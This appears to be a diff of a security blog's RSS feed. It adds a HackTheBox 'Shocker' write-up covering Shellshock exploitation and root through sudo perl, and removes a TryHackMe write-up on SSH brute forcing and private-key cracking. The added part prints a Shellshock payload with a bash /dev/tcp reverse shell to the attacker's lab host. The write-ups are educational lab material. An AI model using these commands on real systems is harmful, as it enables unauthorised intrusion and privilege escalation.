@@ -5,7 +5,247 @@
     <link>https://fahmifj.github.io/tags/linux/</link>
     <description>Recent content in Linux on Ef&#39;s log</description>
     <generator>Hugo -- gohugo.io</generator>
-    <lastBuildDate>Fri, 09 Jul 2021 07:45:19 +0700</lastBuildDate><atom:link href="https://fahmifj.github.io/tags/linux/index.xml" rel="self" type="application/rss+xml" />
+    <lastBuildDate>Tue, 13 Jul 2021 11:30:31 +0700</lastBuildDate><atom:link href="https://fahmifj.github.io/tags/linux/index.xml" rel="self" type="application/rss+xml" />
+    <item>
+      <title>HackTheBox - Shocker</title>
+      <link>https://fahmifj.github.io/writeups/hackthebox/htb-shocker/</link>
+      <pubDate>Tue, 13 Jul 2021 11:30:31 +0700</pubDate>
+      
+      <guid>https://fahmifj.github.io/writeups/hackthebox/htb-shocker/</guid>
+      <description>Shellshock is an easy Linux machines from HackTheBox that introduces a vulnerability called Shellshock (CVE-2014-6271). Exploiting this vulnerability results in an unauthenticated remote code execution, which is leveraged to gain a foothold in the system. There is a sudo privilege on perl , and this can leveraged as well to gain root shell.
+In the end of this write-up, I&amp;rsquo;ll see how the Shellshock vulnerability works.
+Skills Learned  Exploitation of Shellshock vulnerability Exploitation of sudo privileges on perl  Tools  Nmap Burp Suite Gobuster  Reconnaissance A full TCP scan discovers two open ports: an Apache web server on port 80 and SSH on port 2222.</description>
+      <content:encoded><![CDATA[<p>Shellshock is an easy Linux machines from HackTheBox that introduces a vulnerability called Shellshock (CVE-2014-6271). Exploiting this vulnerability results in an unauthenticated remote code execution, which is leveraged to gain a foothold in the system. There is a sudo privilege on <code>perl</code> , and this can leveraged as well to gain root shell.</p>
+<p>In the end of this write-up, I&rsquo;ll see how the Shellshock vulnerability works.</p>
+<h3 id="skills-learned">Skills Learned</h3>
+<ul>
+<li>Exploitation of Shellshock vulnerability</li>
+<li>Exploitation of sudo privileges on perl</li>
+</ul>
+<h3 id="tools">Tools</h3>
+<ul>
+<li>Nmap</li>
+<li>Burp Suite</li>
+<li>Gobuster</li>
+</ul>
+<h2 id="reconnaissance">Reconnaissance</h2>
+<p>A full TCP scan discovers two open ports: an Apache web server on port 80 and SSH on port 2222.</p>
+<h3 id="nmap">Nmap</h3>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">→ kali@kali «shocker» «10.10.14.83» 
+$ nmap -p- -sV -oA nmap/10-tcp-allport-shocker 10.10.10.56 
+Starting Nmap 7.91 <span style="color:#f92672">(</span> https://nmap.org <span style="color:#f92672">)</span> at 2021-07-10 20:24 EDT
+Nmap scan report <span style="color:#66d9ef">for</span> 10.10.10.56
+Host is up <span style="color:#f92672">(</span>0.065s latency<span style="color:#f92672">)</span>.
+Not shown: <span style="color:#ae81ff">65533</span> closed ports
+PORT     STATE SERVICE VERSION
+80/tcp   open  http    Apache httpd 2.4.18 <span style="color:#f92672">((</span>Ubuntu<span style="color:#f92672">))</span>
+2222/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.2 <span style="color:#f92672">(</span>Ubuntu Linux; protocol 2.0<span style="color:#f92672">)</span>
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap <span style="color:#66d9ef">done</span>: <span style="color:#ae81ff">1</span> IP address <span style="color:#f92672">(</span><span style="color:#ae81ff">1</span> host up<span style="color:#f92672">)</span> scanned in 98.00 seconds
+</code></pre></div><h2 id="enumeration">Enumeration</h2>
+<h3 id="tcp-80---website">TCP 80 - Website</h3>
+<p>The site serves only one a text and an image.</p>
+<p><img class="img-container" src="imgs/image-20210711072532615.png" alt="image-20210711072532615"  />
+</p>
+<p>The server response contains uncommon Header called <code>Accept-Ranges</code>. According to <a href="https://developer.mozilla.org/en-US/docs/Web/HTTP/Range_requests#requesting_a_specific_range_from_a_server">MDN</a>, this header is allows us to control the portion of the HTTP message.</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">→ kali@kali «shocker» «10.10.14.83» 
+$ curl -I http://10.10.10.56
+HTTP/1.1 <span style="color:#ae81ff">200</span> OK
+Date: Sun, <span style="color:#ae81ff">11</span> Jul <span style="color:#ae81ff">2021</span> 00:49:51 GMT
+Server: Apache/2.4.18 <span style="color:#f92672">(</span>Ubuntu<span style="color:#f92672">)</span>
+Last-Modified: Fri, <span style="color:#ae81ff">22</span> Sep <span style="color:#ae81ff">2017</span> 20:01:19 GMT
+ETag: <span style="color:#e6db74">&#34;89-559ccac257884&#34;</span>
+Accept-Ranges: bytes
+Content-Length: <span style="color:#ae81ff">137</span>
+Vary: Accept-Encoding
+Content-Type: text/html
+</code></pre></div><p>A <a href="https://www.rapid7.com/db/modules/auxiliary/dos/http/apache_range_dos/">quick search</a> on google finds that it can be used for DDoS attack.</p>
+<h4 id="gobuster">Gobuster</h4>
+<p>A <code>gobuster</code> scan finds two directories:  <code>/cgi-bin/</code> and <code>/icons</code></p>
+<pre><code>→ kali@kali «shocker» «10.10.14.83» 
+$ gobuster dir -u http://10.10.10.56/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt -o gobuster/gobuster-S-80 -f         
+===============================================================
+Gobuster v3.1.0
+by OJ Reeves (@TheColonial) &amp; Christian Mehlmauer (@firefart)
+===============================================================
+[+] Url:                     http://10.10.10.56/
+[+] Method:                  GET
+[+] Threads:                 10
+[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt
+[+] Negative Status codes:   404
+[+] User Agent:              gobuster/3.1.0
+[+] Add Slash:               true
+[+] Timeout:                 10s
+===============================================================
+2021/07/10 20:26:07 Starting gobuster in directory enumeration mode
+===============================================================
+/cgi-bin/             (Status: 403) [Size: 294]
+/icons/               (Status: 403) [Size: 292]
+...[SNIP]...
+</code></pre><p>Another scan on <code>/cgi-bin/</code> discovers a file called <code>users.sh</code></p>
+<pre><code>→ kali@kali «shocker» «10.10.14.83» 
+$ gobuster dir -u http://10.10.10.56/cgi-bin -w /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt -o gobuster/gobuster-cgi-bin -f -x cgi,sh
+===============================================================
+Gobuster v3.1.0
+by OJ Reeves (@TheColonial) &amp; Christian Mehlmauer (@firefart)
+===============================================================
+[+] Url:                     http://10.10.10.56/cgi-bin
+[+] Method:                  GET
+[+] Threads:                 10
+[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt
+[+] Negative Status codes:   404
+[+] User Agent:              gobuster/3.1.0
+[+] Extensions:              cgi,sh
+[+] Add Slash:               true
+[+] Timeout:                 10s
+===============================================================
+2021/07/10 21:43:04 Starting gobuster in directory enumeration mode
+===============================================================
+/user.sh              (Status: 200) [Size: 125]
+...[SNIP]...
+</code></pre><p>The <code>script.sh</code> returns the following contents.</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">→ kali@kali «shocker» «10.10.14.83» 
+$ curl -s http://10.10.10.56/cgi-bin/user.sh
+Content-Type: text/plain
+
+Just an uptime test script
+
+ 21:46:09 up <span style="color:#ae81ff">1</span> day, 20:28,  <span style="color:#ae81ff">0</span> users,  load average: 0.00, 0.01, 0.00
+
+</code></pre></div><p>According to the box name and a <code>/cgi-bin/</code> folder which contains a bash script, it&rsquo;s going to be shellshock vulnerability.</p>
+<h2 id="foothold">Foothold</h2>
+<h3 id="shell-as-shelly">Shell as shelly</h3>
+<h4 id="shellshock-cve-2014-6271">Shellshock (CVE-2014-6271)</h4>
+<p>The Shellshock vulnerability is well explained in this <a href="https://pentesterlab.com/exercises/cve-2014-6271/course">free course</a> by PentesterLab.</p>
+<p>The following is the commonly used PoC for shellshock.</p>
+<pre><code>(){:}; echo; &lt;bash command&gt;
+</code></pre><p>The PoC works on <code>User-Agent</code> header.</p>
+<p><img class="img-container" src="imgs/image-20210711090447537-1626151933213.png" alt="image-20210711090447537"  />
+</p>
+<p>It also works on the  <code>Accept</code> header (I&rsquo;m shocked now 😄).</p>
+<p><img class="img-container" src="imgs/image-20210711085942731.png" alt="image-20210711085942731"  />
+</p>
+<h4 id="reverse-shell">Reverse Shell</h4>
+<p>I tried to get a shell but somehow it didn&rsquo;t connect back, but then I figured out why after redirecting stderr to stderr, it wanted a full path!</p>
+<p><img class="img-container" src="imgs/image-20210711091930431.png" alt="image-20210711091930431"  />
+</p>
+<p>The installed <code>nc</code> doesn&rsquo;t have <code>-e</code>.</p>
+<p><img class="img-container" src="imgs/image-20210711092401328.png" alt="image-20210711092401328"  />
+</p>
+<p>The following bash reverse shell works.</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell"><span style="color:#f92672">()</span> <span style="color:#f92672">{</span> :;<span style="color:#f92672">}</span>; echo; echo <span style="color:#e6db74">&#34;/bin/bash -i &gt;&amp; /dev/tcp/10.10.14.83/53 0&gt;&amp;1&#34;</span> | /bin/bash
+</code></pre></div><p><img class="img-container" src="imgs/image-20210711093314357.png" alt="image-20210711093314357"  />
+</p>
+<h4 id="shell-upgrade">Shell Upgrade</h4>
+<p>I&rsquo;ll upgrade my shell using the PTY trick (that&rsquo;s how I called it).</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">shelly@Shocker:/usr/lib/cgi-bin$ export TERM<span style="color:#f92672">=</span>xterm
+export TERM<span style="color:#f92672">=</span>xterm
+shelly@Shocker:/usr/lib/cgi-bin$ script /dev/null -c bash                    
+script /dev/null -c bash
+Script started, file is /dev/null
+shelly@Shocker:/usr/lib/cgi-bin$ ^Z
+<span style="color:#f92672">[</span>1<span style="color:#f92672">]</span>  + <span style="color:#ae81ff">7339</span> suspended  nc -nvlp <span style="color:#ae81ff">53</span>
+→ kali@kali «shocker» «10.10.14.83» 
+$ stty raw -echo; fg
+<span style="color:#f92672">[</span>1<span style="color:#f92672">]</span>  + <span style="color:#ae81ff">7339</span> continued  nc -nvlp <span style="color:#ae81ff">53</span>
+
+shelly@Shocker:/usr/lib/cgi-bin$  
+</code></pre></div><p>The user flag is done here.</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">shelly@Shocker:/home/shelly$ ls -l 
+total <span style="color:#ae81ff">8</span>
+drwxr-xr-x <span style="color:#ae81ff">2</span> shelly shelly <span style="color:#ae81ff">4096</span> Jul <span style="color:#ae81ff">10</span> 03:31 test
+-r--r--r-- <span style="color:#ae81ff">1</span> root   root     <span style="color:#ae81ff">33</span> Jul  <span style="color:#ae81ff">9</span> 01:17 user.txt
+shelly@Shocker:/home/shelly$ cat user.txt 
+7ac9eb73e6cb...<span style="color:#f92672">[</span>SNIP<span style="color:#f92672">]</span>...
+</code></pre></div><h2 id="privilege-escalation">Privilege Escalation</h2>
+<h3 id="shell-as-root">Shell as root</h3>
+<h4 id="internal-enumeration">Internal Enumeration</h4>
+<p>A quick check on sudo privileges reveals that user <code>shelly</code> can run <code>perl</code> with <code>sudo</code>.</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">shelly@Shocker:/usr/lib/cgi-bin$ sudo -l
+sudo -l
+Matching Defaults entries <span style="color:#66d9ef">for</span> shelly on Shocker:
+    env_reset, mail_badpass,
+    secure_path<span style="color:#f92672">=</span>/usr/local/sbin<span style="color:#ae81ff">\:</span>/usr/local/bin<span style="color:#ae81ff">\:</span>/usr/sbin<span style="color:#ae81ff">\:</span>/usr/bin<span style="color:#ae81ff">\:</span>/sbin<span style="color:#ae81ff">\:</span>/bin<span style="color:#ae81ff">\:</span>/snap/bin
+
+User shelly may run the following commands on Shocker:
+    <span style="color:#f92672">(</span>root<span style="color:#f92672">)</span> NOPASSWD: /usr/bin/perl
+</code></pre></div><h4 id="sudo---perl">Sudo - perl</h4>
+<p>Using <a href="https://gtfobins.github.io/gtfobins/perl/#sudo">GTFOBins</a> as reference, I&rsquo;m now root.</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">shelly@Shocker:/home/shelly$ sudo -u root perl -e <span style="color:#e6db74">&#39;exec &#34;/bin/bash&#34;;&#39;</span>
+root@Shocker:/home/shelly# id <span style="color:#f92672">&amp;&amp;</span> hostname
+uid<span style="color:#f92672">=</span>0<span style="color:#f92672">(</span>root<span style="color:#f92672">)</span> gid<span style="color:#f92672">=</span>0<span style="color:#f92672">(</span>root<span style="color:#f92672">)</span> groups<span style="color:#f92672">=</span>0<span style="color:#f92672">(</span>root<span style="color:#f92672">)</span>
+Shocker
+root@Shocker:/home/shelly#
+</code></pre></div><p>The root flag.</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">root@Shocker:~# cat root.txt
+e3689b13acb2...<span style="color:#f92672">[</span>SNIP<span style="color:#f92672">]</span>...
+</code></pre></div><h2 id="extras">Extras</h2>
+<p>Since this vulnerability is interesting yet dangerous, I&rsquo;d like to observe how it works.</p>
+<h3 id="playing-a-bit-with-shellshock">Playing a bit with Shellshock</h3>
+<p>I did a quick test using the following script which placed under /<code>cgi-bin/</code> folder. The script will prints all the environment variables.</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">root@Shocker:/usr/lib/cgi-bin# echo -e <span style="color:#e6db74">&#39;#!/bin/bash\necho test\nenv&#39;</span> &gt; iamf.sh
+root@Shocker:/usr/lib/cgi-bin# chmod +x iamf.sh 
+</code></pre></div><p>And now I could understand why it is so dangerous. It even exports my custom header and turns it into an environment variable.</p>
+<p><img class="img-container" src="imgs/image-20210711100705447.png" alt="image-20210711100705447"  />
+</p>
+<p>The full response</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-text" data-lang="text">HTTP/1.1 200 OK
+Date: Sun, 11 Jul 2021 03:06:31 GMT
+Server: Apache/2.4.18 (Ubuntu)
+Connection: close
+Content-Type: text/x-sh
+Content-Length: 1113
+
+iamf
+test
+SERVER_SIGNATURE=&lt;address&gt;Apache/2.4.18 (Ubuntu) Server at 10.10.10.56 Port 80&lt;/address&gt;
+
+HTTP_USER_AGENT=Blackhole
+SERVER_PORT=80
+HTTP_HOST=10.10.10.56
+DOCUMENT_ROOT=/var/www/html
+SCRIPT_FILENAME=/usr/lib/cgi-bin/iamf.sh
+REQUEST_URI=/cgi-bin/iamf.sh
+SCRIPT_NAME=/cgi-bin/iamf.sh
+HTTP_CONNECTION=close
+REMOTE_PORT=58222
+PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
+HTTP_IF_NONE_MATCH=&#34;89-559ccac257884-gzip&#34;
+CONTEXT_PREFIX=/cgi-bin/
+PWD=/usr/lib/cgi-bin
+SERVER_ADMIN=webmaster@localhost
+REQUEST_SCHEME=http
+HTTP_IF_MODIFIED_SINCE=Fri, 22 Sep 2017 20:01:19 GMT
+HTTP_ACCEPT_LANGUAGE=en-US,en;q=0.5
+HTTP_ACCEPT=text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
+REMOTE_ADDR=10.10.14.83
+SHLVL=1
+SERVER_NAME=10.10.10.56
+CONTENT_LENGTH=0
+SERVER_SOFTWARE=Apache/2.4.18 (Ubuntu)
+QUERY_STRING=
+SERVER_ADDR=10.10.10.56
+GATEWAY_INTERFACE=CGI/1.1
+HTTP_UPGRADE_INSECURE_REQUESTS=1
+SERVER_PROTOCOL=HTTP/1.1
+HTTP_CACHE_CONTROL=max-age=0
+HTTP_ACCEPT_ENCODING=gzip, deflate
+REQUEST_METHOD=GET
+CONTEXT_DOCUMENT_ROOT=/usr/lib/cgi-bin/
+HTTP_IAMF_HEADER=() {  :
+}
+_=/usr/bin/env
+</code></pre></div><hr>
+<h2 id="references">Reference(s)</h2>
+<ul>
+<li><a href="https://pentesterlab.com/exercises/cve-2014-6271/course">https://pentesterlab.com/exercises/cve-2014-6271/course</a></li>
+<li><a href="https://gtfobins.github.io/gtfobins/perl/#sudo">https://gtfobins.github.io/gtfobins/perl/#sudo</a></li>
+</ul>
+]]></content:encoded>
+    </item>
+    
     <item>
       <title>My Kali Linux Setup for Playing HackTheBox</title>
       <link>https://fahmifj.github.io/blog/my-kali-linux-setup-for-playing-hackthebox/</link>
@@ -890,211 +1130,6 @@ spectra
 <li><a href="https://www.hackingarticles.in/wordpress-reverse-shell/">https://www.hackingarticles.in/wordpress-reverse-shell/</a></li>
 <li><a href="https://github.com/pentestmonkey/php-reverse-shell">https://github.com/pentestmonkey/php-reverse-shell</a></li>
 <li><a href="https://www.digitalocean.com/community/tutorials/the-upstart-event-system-what-it-is-and-how-to-use-it">https://www.digitalocean.com/community/tutorials/the-upstart-event-system-what-it-is-and-how-to-use-it</a></li>
-</ul>
-]]></content:encoded>
-    </item>
-    
-    <item>
-      <title>TryHackMe - Basic Pentesting</title>
-      <link>https://fahmifj.github.io/writeups/tryhackme/thm-basic-pentesting/</link>
-      <pubDate>Fri, 18 Jun 2021 19:15:35 +0700</pubDate>
-      
-      <guid>https://fahmifj.github.io/writeups/tryhackme/thm-basic-pentesting/</guid>
-      <description>This is a machine that allows you to practise web app hacking and privilege escalation </description>
-      <content:encoded><![CDATA[<fieldset>
-<legend>Room Information </legend>
-<ul>
-<li><strong>Name:</strong> <a href="https://tryhackme.com/room/basicpentestingjt">Basic Pentesting</a></li>
-<li><strong>Category:</strong> Boot2root</li>
-<li><strong>Type</strong>: Challenge/CTF</li>
-<li><strong>Difficulty:</strong> Easy</li>
-<li><strong>Tools</strong>:
-<ul>
-<li>Nmap</li>
-<li>Gobuster</li>
-<li>John the Ripper</li>
-<li>smbclient</li>
-</ul>
-</li>
-<li><strong>Skills Learned</strong>
-<ul>
-<li>Basics of enumeration</li>
-<li>Brute-force attack</li>
-</ul>
-</li>
-</ul>
-</fieldset>
-<h2 id="reconnaissance">Reconnaissance</h2>
-<h3 id="nmap">Nmap</h3>
-<p><code>nmap</code> full scan discovers six open ports: SSH (22), HTTP (80), SMB (139 &amp; 445), Apache JServ Protocol (8009), and Apache Tomcat (8080).</p>
-<p><img class="img-container" src="imgs/image-20210530002323622.png" alt="image-20210530002323622"  />
-</p>
-<h2 id="enumeration">Enumeration</h2>
-<h3 id="tcp-445---smb">TCP 445 - SMB</h3>
-<p>Anonymous login is allowed on SMB.</p>
-<p><img class="img-container" src="imgs/image-20210530004538478-1624087102246.png" alt="image-20210530004538478"  />
-</p>
-<p>Accessing <code>anonymous</code> share with anonymous logon finds a text file called <code>staff.txt</code>. I&rsquo;ll grab that file to my machine</p>
-<p><img class="img-container" src="imgs/image-20210530004922142.png" alt="image-20210530004922142"  />
-</p>
-<p>The contents of <code>staff.txt</code> reveals two potential usernames: <code>jan</code> and <code>kay</code>.</p>
-<p><img class="img-container" src="imgs/image-20210530004937052.png" alt="image-20210530004937052"  />
-</p>
-<h3 id="tcp-80---web">TCP 80 - Web</h3>
-<p>Poking the web with <code>curl</code> finds out that it is under maintenance.</p>
-<p><img class="img-container" src="imgs/image-20210530004040209.png" alt="image-20210530004040209"  />
-</p>
-<h4 id="gobuster">Gobuster</h4>
-<p><code>Gobuster</code> scan discovers one hidden directory called <code>development</code>.</p>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">→ root@kali «basic-pentesting» «10.9.30.115»
-$ gobuster dir -u http://10.10.67.164/ -w /opt/SecLists/Discovery/Web-Content/raft-small-directories-lowercase.txt gobuster/gobuster-S-80 --no-error -z
-<span style="color:#f92672">===============================================================</span>
-Gobuster v3.1.0
-by OJ Reeves <span style="color:#f92672">(</span>@TheColonial<span style="color:#f92672">)</span> &amp; Christian Mehlmauer <span style="color:#f92672">(</span>@firefart<span style="color:#f92672">)</span>
-<span style="color:#f92672">===============================================================</span>
-<span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Url:                     http://10.10.67.164/
-<span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Method:                  GET
-<span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Threads:                 <span style="color:#ae81ff">10</span>
-<span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Wordlist:                /opt/SecLists/Discovery/Web-Content/raft-small-directories-lowercase.txt
-<span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Negative Status codes:   <span style="color:#ae81ff">404</span>
-<span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> User Agent:              gobuster/3.1.0
-<span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Timeout:                 10s
-<span style="color:#f92672">===============================================================</span>
-2021/05/29 13:43:47 Starting gobuster in directory enumeration mode
-<span style="color:#f92672">===============================================================</span>
-/development          <span style="color:#f92672">(</span>Status: 301<span style="color:#f92672">)</span> <span style="color:#f92672">[</span>Size: 318<span style="color:#f92672">]</span> <span style="color:#f92672">[</span>--&gt; http://10.10.67.164/development/<span style="color:#f92672">]</span>
-</code></pre></div><h4 id="development">/development</h4>
-<p>The web has a directory listing enabled on <code>/development</code>, and there are two text files in that directory:  <code>dev.txt</code> and <code>j.txt</code></p>
-<p><img class="img-container" src="imgs/image-20210530010100831.png" alt="image-20210530010100831"  />
-</p>
-<p><code>j.txt</code>  contains a note from K to J.</p>
-<p><img class="img-container" src="imgs/image-20210530010150205.png" alt="image-20210530010150205"  />
-</p>
-<p>From the previous SMB enumeration, K and J here are probably Kay and Jan. If so, I could try a brute-force attack on user Jay, since Kay is pointing out that Jan has a weak password.</p>
-<p><code>dev.txt</code> contains about project development logs.</p>
-<p><img class="img-container" src="imgs/image-20210530010131055.png" alt="image-20210530010131055"  />
-</p>
-<h3 id="finding-vulnerabilities">Finding Vulnerabilities</h3>
-<p>There are some potential exploits for Apache Structs 2.5.12, which I could try later.</p>
-<p><img class="img-container" src="imgs/image-20210619142047338.png" alt="image-20210619142047338"  />
-</p>
-<h2 id="foothold">Foothold</h2>
-<p>For foothold, I have two options: brute force and exploiting Apache Struts.</p>
-<p>Brute force might take some time, so I&rsquo;ll leave it on the background and start with Apache Struts.</p>
-<h3 id="shell-as-tomcat">Shell as tomcat</h3>
-<h4 id="apache-struts-rce-cve-2017-9805">Apache Struts RCE CVE-2017-9805</h4>
-<p>Metasploit also has an <a href="https://www.rapid7.com/db/modules/exploit/multi/http/struts2_rest_xstream/">exploit module</a> for this, so I&rsquo;ll  fire up  <code>metasploit</code>. But, first, I need to find out the Apache Struts URI.</p>
-<p>Looking back to the <code>dev.txt</code> file, it seems Kay uses this <a href="https://mvnrepository.com/artifact/org.apache.struts/struts2-showcase/2.5.12">example showcase</a>.</p>
-<p><img class="img-container" src="imgs/image-20210619131650429.png" alt="image-20210619131650429"  />
-</p>
-<p>I also came across this <a href="https://samsclass.info/124/proj14/p10xstruts.htm">blog post</a> and found this:</p>
-<p><img class="img-container" src="imgs/image-20210619132136356.png" alt="image-20210619132136356"  />
-</p>
-<p>I visited <code>/struts2-rest-showcase-2.5.12/</code>, and it&rsquo;s there.</p>
-<p><img class="img-container" src="imgs/image-20210619132449500.png" alt="image-20210619132449500"  />
-</p>
-<p>It tried it with <code>metasploit</code> and it worked!</p>
-<p><img class="img-container" src="imgs/image-20210619142842848.png" alt="image-20210619142842848"  />
-</p>
-<h3 id="shell-as-jan">Shell as jan</h3>
-<h4 id="ssh-brute-force">SSH Brute Force</h4>
-<p>It turns out <code>Hydra</code> finds Jan&rsquo;s SSH password in less than 2 minutes. The password is <code>armando</code>.</p>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">→ root@kali «basic-pentesting» «10.9.30.115» 
-$ hydra -l jan -P /opt/SecLists/Passwords/Common-Credentials/best1050.txt ssh://10.10.245.112 
-Hydra v9.0 <span style="color:#f92672">(</span>c<span style="color:#f92672">)</span> <span style="color:#ae81ff">2019</span> by van Hauser/THC - Please <span style="color:#66d9ef">do</span> not use in military or secret service organizations, or <span style="color:#66d9ef">for</span> illegal purposes.
-
-...&lt;SNIP&gt;...
-<span style="color:#f92672">[</span>22<span style="color:#f92672">][</span>ssh<span style="color:#f92672">]</span> host: 10.10.245.112   login: jan   password: armando
-<span style="color:#ae81ff">1</span> of <span style="color:#ae81ff">1</span> target successfully completed, <span style="color:#ae81ff">1</span> valid password found
-...&lt;SNIP&gt;...
-Hydra <span style="color:#f92672">(</span>https://github.com/vanhauser-thc/thc-hydra<span style="color:#f92672">)</span> finished at 2021-05-29 14:20:56
-</code></pre></div><p>Now I can login as Jan with SSH client.</p>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">→ root@kali «basic-pentesting» «10.9.30.115» 
-$ ssh jan@10.10.245.112 
-jan@10.10.245.112<span style="color:#960050;background-color:#1e0010">&#39;</span>s password: 
-Welcome to Ubuntu 16.04.4 LTS <span style="color:#f92672">(</span>GNU/Linux 4.4.0-119-generic x86_64<span style="color:#f92672">)</span>
-...&lt;SNIP&gt;...
-Last login: Mon Apr <span style="color:#ae81ff">23</span> 15:55:45 <span style="color:#ae81ff">2018</span> from 192.168.56.102
-jan@basic2:~$ id
-uid<span style="color:#f92672">=</span>1001<span style="color:#f92672">(</span>jan<span style="color:#f92672">)</span> gid<span style="color:#f92672">=</span>1001<span style="color:#f92672">(</span>jan<span style="color:#f92672">)</span> groups<span style="color:#f92672">=</span>1001<span style="color:#f92672">(</span>jan<span style="color:#f92672">)</span>
-</code></pre></div><p>Since <code>jan</code> has SSH login, I&rsquo;ll definitely use this for enumeration.</p>
-<h2 id="privilege-escalation">Privilege Escalation</h2>
-<h3 id="internal-enumeration">Internal Enumeration</h3>
-<p>Enumerating Kay&rsquo;s home directory finds a readable SSH key</p>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">jan@basic2:/home/kay/.ssh$ ls -la
-total <span style="color:#ae81ff">20</span>
-drwxr-xr-x <span style="color:#ae81ff">2</span> kay kay <span style="color:#ae81ff">4096</span> Apr <span style="color:#ae81ff">23</span>  <span style="color:#ae81ff">2018</span> .
-drwxr-xr-x <span style="color:#ae81ff">5</span> kay kay <span style="color:#ae81ff">4096</span> Apr <span style="color:#ae81ff">23</span>  <span style="color:#ae81ff">2018</span> ..
--rw-rw-r-- <span style="color:#ae81ff">1</span> kay kay  <span style="color:#ae81ff">771</span> Apr <span style="color:#ae81ff">23</span>  <span style="color:#ae81ff">2018</span> authorized_keys
--rw-r--r-- <span style="color:#ae81ff">1</span> kay kay <span style="color:#ae81ff">3326</span> Apr <span style="color:#ae81ff">19</span>  <span style="color:#ae81ff">2018</span> id_rsa
--rw-r--r-- <span style="color:#ae81ff">1</span> kay kay  <span style="color:#ae81ff">771</span> Apr <span style="color:#ae81ff">19</span>  <span style="color:#ae81ff">2018</span> id_rsa.pub
-</code></pre></div><p>I tried the key to SSH login locally as user Kay but it asked for a password, so I&rsquo;ll just grab the private key for cracking.</p>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">jan@basic2:/home/kay/.ssh$ cat id_rsa
------BEGIN RSA PRIVATE KEY-----                                                      
-Proc-Type: 4,ENCRYPTED                                                               
-DEK-Info: AES-128-CBC,6ABA7DE35CDB65070B92C1F760E2FE75                               
-                                                                                     
-IoNb/J0q2Pd56EZ23oAaJxLvhuSZ1crRr4ONGUAnKcRxg3+9vn6xcujpzUDuUtlZ                     
-o9dyIEJB4wUZTueBPsmb487RdFVkTOVQrVHty1K2aLy2Lka2Cnfjz8Llv+FMadsN                     
-XRvjw/HRiGcXPY8B7nsA1eiPYrPZHIH3QOFIYlSPMYv79RC65i6frkDSvxXzbdfX                     
-...&lt;SNIP&gt;...
-4eaCAHk1hUL3eseN3ZpQWRnDGAAPxH+LgPyE8Sz1it8aPuP8gZABUFjBbEFMwNYB
-e5ofsDLuIOhCVzsw/DIUrF+4liQ3R36Bu2R5+kmPFIkkeW1tYWIY7CpfoJSd74VC
-3Jt1/ZW3XCb76R75sG5h6Q4N8gu5c/M0cdq16H9MHwpdin9OZTqO2zNxFvpuXthY
------END RSA PRIVATE KEY-----
-</code></pre></div><h3 id="cracking-id_rsa">Cracking id_rsa</h3>
-<p>I&rsquo;ll convert Kay&rsquo;s <code>id_rsa</code> to hash using <code>ssh2john.py</code>.</p>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">→ root@kali «basic-pentesting» «10.9.30.115» 
-$ /usr/share/john/ssh2john.py kay_rsa &gt; kay_rsa.hash; cat kay_rsa.hash
